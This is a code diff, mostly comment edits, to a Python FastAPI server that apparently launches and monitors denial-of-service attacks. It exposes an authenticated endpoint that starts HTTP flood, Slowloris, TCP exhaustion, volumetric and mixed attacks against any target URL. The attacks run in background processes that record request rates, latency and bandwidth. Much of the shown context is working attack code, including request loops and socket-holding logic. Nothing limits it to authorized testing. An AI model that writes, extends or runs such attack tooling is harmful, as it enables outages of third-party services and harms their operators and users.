@@ -24,7 +24,7 @@ security = HTTPBearer()
 # FastAPI app
 app = FastAPI()
 
-# Allow CORS for Next.js or any other frontend framework
+# Allow CORS for frontends (e.g., Next.js)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -75,7 +75,6 @@ class AttackStats(BaseModel):
     request_performance: dict = {}  # keys: requests_per_second, success_failure_ratio
 
     def to_dict(self) -> Dict[str, Any]:
-        # Compute additional metrics if latency samples exist
         latencies = self.latency_samples if self.latency_samples else []
         min_latency = min(latencies) if latencies else None
         max_latency = max(latencies) if latencies else None
@@ -142,13 +141,12 @@ def update_request_performance(shared_stats: Dict, elapsed_time: float):
 
 # ------------------ Attack Implementations with Enhanced Metrics ------------------- #
 
-# Sophisticated HTTP Flood Attack:
+# Sophisticated HTTP Flood Attack
 def http_flood(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                shared_stats: Dict, shared_logs: Dict):
     start_time = time.time()
     shared_stats["requests_sent"] = 0
     shared_stats["errors"] = 0
-    # Initialize enhanced metric containers
     shared_stats.setdefault("latency_samples", [])
     shared_stats.setdefault("http_status_codes", {})
     shared_stats.setdefault("timeout_count", 0)
@@ -164,19 +162,18 @@ def http_flood(target_url: str, duration: int, intensity: int, concurrent_connec
             req_start = time.perf_counter()
             response = requests.get(target_url, headers=headers, timeout=5)
             req_end = time.perf_counter()
-            latency = (req_end - req_start) * 1000  # milliseconds
-            # Update latency metrics
+            latency = (req_end - req_start) * 1000  # ms
+            # Update latency metrics (keeping last 10 samples)
             latencies = shared_stats["latency_samples"]
             latencies.append(latency)
             if len(latencies) > 10:
                 latencies.pop(0)
-            # Update request count
             shared_stats["requests_sent"] += 1
-            # Track HTTP status codes
+            # Update HTTP status code counts
             code = response.status_code
             http_codes = shared_stats["http_status_codes"]
             http_codes[code] = http_codes.get(code, 0) + 1
-            # Track download bandwidth
+            # Update download bandwidth metrics
             downloaded = len(response.content)
             bw = shared_stats["bandwidth"]
             bw["total_data_transferred"] += downloaded
@@ -199,23 +196,21 @@ def http_flood(target_url: str, duration: int, intensity: int, concurrent_connec
             shared_logs.setdefault("http_flood", []).append(
                 f"{datetime.now().isoformat()}: HTTP Flood Error: {e}"
             )
-    # Update request performance metrics on completion
     elapsed = time.time() - start_time
     update_request_performance(shared_stats, elapsed)
     return
 
-# Sophisticated Slowloris Attack:
+# Sophisticated Slowloris Attack
 def slowloris(target_url: str, duration: int, intensity: int, concurrent_connections: int,
               shared_stats: Dict, shared_logs: Dict):
     start_time = time.time()
     sockets = []
     shared_stats["connections_open"] = 0
     shared_stats["errors"] = 0
-    # Initialize connection metrics
     shared_stats.setdefault("connection_metrics", {"attempts": 0, "successes": 0, "active_connections": 0, "lifetimes": []})
     host, port = extract_host(target_url)
     conn_metrics = shared_stats["connection_metrics"]
-    connection_start_times = []  # Local list to record open time of each connection
+    connection_start_times = []  # Record each connection's open time
 
     for _ in range(concurrent_connections):
         try:
@@ -250,7 +245,7 @@ def slowloris(target_url: str, duration: int, intensity: int, concurrent_connect
             shared_logs.setdefault("slowloris", []).append(
                 f"{datetime.now().isoformat()}: Slowloris loop error: {e}"
             )
-    # Proper cleanup: Close sockets and update connection lifetimes
+    # Proper cleanup: Close sockets and record connection lifetimes
     for idx, s in enumerate(sockets):
         try:
             s.close()
@@ -264,7 +259,7 @@ def slowloris(target_url: str, duration: int, intensity: int, concurrent_connect
             )
     return
 
-# Sophisticated TCP Exhaustion Attack:
+# Sophisticated TCP Exhaustion Attack
 def tcp_exhaustion(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                    shared_stats: Dict, shared_logs: Dict):
     start_time = time.time()
@@ -305,7 +300,7 @@ def tcp_exhaustion(target_url: str, duration: int, intensity: int, concurrent_co
             )
     return
 
-# Sophisticated Volumetric Attack:
+# Sophisticated Volumetric Attack
 def volumetric(target_url: str, duration: int, intensity: int, concurrent_connections: int,
                shared_stats: Dict, shared_logs: Dict):
     start_time = time.time()
@@ -358,7 +353,7 @@ def mixed(target_url: str, duration: int, intensity: int, concurrent_connections
     shared_stats.update(combined)
     return
 
-# Attack dispatcher - now accepts additional shared dicts for stats and logs
+# Attack dispatcher: accepts shared stats and logs, updates complete state
 def execute_attack(config: AttackConfig, shared_stats: Dict, shared_logs: Dict):
     shared_stats["start_time"] = datetime.now().isoformat()
     attack_func = {
@@ -381,12 +376,11 @@ def execute_attack(config: AttackConfig, shared_stats: Dict, shared_logs: Dict):
 @app.post("/api/attack/start", dependencies=[Depends(authenticate)])
 async def start_attack(config: AttackConfig):
     attack_id = str(len(attack_processes) + 1)
-    # Initialize enhanced stats with AttackStats defaults
     stats_obj = AttackStats(start_time=datetime.now(), complete=False)
     attack_stats[attack_id] = manager.dict(stats_obj.to_dict())
     attack_logs[attack_id] = manager.list()
     
-    # Launch the attack in a separate process, ensuring proper cleanup in sub-processes
+    # Launch attack process with proper cleanup measures
     process = multiprocessing.Process(target=execute_attack, args=(config, attack_stats[attack_id], attack_logs[attack_id]))
     process.start()
     attack_processes[attack_id] = process
@@ -399,7 +393,7 @@ async def stop_attack(attack_id: str):
         try:
             process = attack_processes[attack_id]
             process.terminate()
-            process.join(timeout=5)  # Ensure process is cleaned up
+            process.join(timeout=5)  # Ensure process termination and cleanup
         except Exception as e:
             logger.error(f"Error during termination of attack {attack_id}: {e}")
         finally:
@@ -434,7 +428,6 @@ async def get_realtime_stats(attack_id: str):
     else:
         raise HTTPException(status_code=404, detail="Attack not found")
 
-# To run the app
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8000)
